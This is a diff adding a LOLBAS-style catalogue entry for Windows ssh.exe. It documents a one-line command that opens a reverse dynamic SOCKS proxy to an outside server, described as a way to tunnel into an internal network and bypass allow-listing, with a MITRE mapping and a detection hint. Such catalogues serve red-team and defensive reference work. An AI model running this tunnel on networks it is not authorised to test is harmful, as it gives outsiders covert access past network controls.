@@ -1,0 +1,26 @@
+---
+Name: Ssh.exe
+Description: Openssh client is available by default on Windows 10 1803, Windows Server 2019
+Author: 'Chris Wu'
+Created: '2019-11-25'
+Commands:
+  - Command: ssh limited-user@externallyaccessibleserver.com -N -R 9999
+    Description: Create a reverse dynamic forwarding socks proxy from an outbound ssh client connection. The version of Openssh packaged in Windows 10 is currently OpenSSH 7.7p1 (as of 2019-11-25) which has support for reverse dynamic forwarding.  
+    Usecase: Tunnel into internal network from an outbound ssh client connection, requires setup of an externally accessible ssh server, create a limited ssh user that has remote port forwarding privileges only. Setup information over at resources link. 
+    Category: AWL bypass 
+    Privileges: User
+    MitreID: T1133
+    MitreLink: https://attack.mitre.org/techniques/T1133/
+    OperatingSystem: Windows 10 1803, Windows Server 2019
+Full_Path:
+  - Path: C:\Windows\System32\OpenSSH\ssh.exe
+Code_Sample: 
+- Code:
+Detection:
+ - IOC: Outbound connections using ssh.exe
+Resources:
+  - Link: https://github.com/Potato-Industries/ssh.exe-windows-10-lolbas
+Acknowledgement:
+  - Person: Chris Wu
+    Handle:
+---
